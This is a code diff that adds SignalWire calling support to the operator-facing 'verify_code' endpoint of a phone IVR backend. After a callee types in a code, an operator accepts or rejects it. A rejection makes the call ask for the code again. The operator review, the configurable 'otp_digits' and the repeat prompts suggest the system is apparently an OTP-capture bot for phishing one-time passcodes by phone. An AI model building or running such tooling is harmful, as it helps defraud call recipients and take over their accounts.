@@ -679,10 +679,52 @@ async def verify_code(call_id: str, request: Request, background_tasks: Backgrou
             raise HTTPException(status_code=404, detail="Call not found")
         
         infobip_call_id = call_log.get("infobip_call_id")
+        signalwire_call_sid = call_log.get("signalwire_call_sid")
+        provider = call_log.get("provider", "infobip")
         
         if is_accepted:
             # Accept - play accepted message then hangup
-            if infobip_call_id and INFOBIP_API_KEY:
+            if provider == "signalwire" and signalwire_call_sid:
+                # Update SignalWire call
+                await db.call_logs.update_one(
+                    {"id": call_id},
+                    {"$set": {"verification_result": "accepted", "current_step": "accepted", "awaiting_verification": False}}
+                )
+                await add_call_event(call_id, "VERIFICATION_ACCEPTED", "Code accepted!")
+                
+                # Continue SignalWire call with accepted message
+                try:
+                    import base64
+                    auth_string = f"{SIGNALWIRE_PROJECT_ID}:{SIGNALWIRE_AUTH_TOKEN}"
+                    auth_bytes = base64.b64encode(auth_string.encode()).decode()
+                    
+                    steps = call_log.get("steps", {})
+                    config = call_log.get("config", {})
+                    message = format_tts_message(steps.get("accepted", "Thank you. Goodbye."), config)
+                    
+                    laml = f'''<?xml version="1.0" encoding="UTF-8"?>
+<Response>
+    <Say>{message}</Say>
+    <Hangup/>
+</Response>'''
+                    
+                    async with httpx.AsyncClient() as client:
+                        response = await client.post(
+                            f"https://{SIGNALWIRE_SPACE_URL}/api/laml/2010-04-01/Accounts/{SIGNALWIRE_PROJECT_ID}/Calls/{signalwire_call_sid}.json",
+                            data={"Twiml": laml},
+                            headers={
+                                "Authorization": f"Basic {auth_bytes}",
+                                "Content-Type": "application/x-www-form-urlencoded"
+                            },
+                            timeout=30.0
+                        )
+                        logger.info(f"SignalWire accept response: {response.status_code}")
+                    
+                    await add_call_event(call_id, "ACCEPTED_PLAYING", "Playing: Thank you message...")
+                except Exception as e:
+                    logger.error(f"Error updating SignalWire call: {e}")
+                    
+            elif infobip_call_id and INFOBIP_API_KEY:
                 background_tasks.add_task(execute_ivr_step, call_id, "accepted")
             else:
                 # Simulation
@@ -701,7 +743,47 @@ async def verify_code(call_id: str, request: Request, background_tasks: Backgrou
                 await add_call_event(call_id, "CALL_FINISHED", "Call completed successfully")
         else:
             # Deny - play rejected message and collect new code
-            if infobip_call_id and INFOBIP_API_KEY:
+            if provider == "signalwire" and signalwire_call_sid:
+                await db.call_logs.update_one(
+                    {"id": call_id},
+                    {"$set": {"awaiting_verification": False, "current_step": "rejected", "dtmf_code": None}}
+                )
+                await add_call_event(call_id, "VERIFICATION_REJECTED", "Code rejected! Asking for new code...")
+                
+                # Continue SignalWire call with rejected message and gather
+                try:
+                    import base64
+                    auth_string = f"{SIGNALWIRE_PROJECT_ID}:{SIGNALWIRE_AUTH_TOKEN}"
+                    auth_bytes = base64.b64encode(auth_string.encode()).decode()
+                    
+                    steps = call_log.get("steps", {})
+                    config = call_log.get("config", {})
+                    message = format_tts_message(steps.get("rejected", "Please enter the code again."), config)
+                    
+                    laml = f'''<?xml version="1.0" encoding="UTF-8"?>
+<Response>
+    <Gather numDigits="{config.get('otp_digits', 6)}" action="{WEBHOOK_BASE_URL}/api/signalwire-webhook/voice" timeout="10">
+        <Say>{message}</Say>
+    </Gather>
+</Response>'''
+                    
+                    async with httpx.AsyncClient() as client:
+                        response = await client.post(
+                            f"https://{SIGNALWIRE_SPACE_URL}/api/laml/2010-04-01/Accounts/{SIGNALWIRE_PROJECT_ID}/Calls/{signalwire_call_sid}.json",
+                            data={"Twiml": laml},
+                            headers={
+                                "Authorization": f"Basic {auth_bytes}",
+                                "Content-Type": "application/x-www-form-urlencoded"
+                            },
+                            timeout=30.0
+                        )
+                        logger.info(f"SignalWire reject response: {response.status_code}")
+                    
+                    await add_call_event(call_id, "REJECTED_PLAYING", "Playing: Please enter the code again...")
+                except Exception as e:
+                    logger.error(f"Error updating SignalWire call: {e}")
+                    
+            elif infobip_call_id and INFOBIP_API_KEY:
                 background_tasks.add_task(execute_ivr_step, call_id, "rejected")
             else:
                 # Simulation - ask for new code
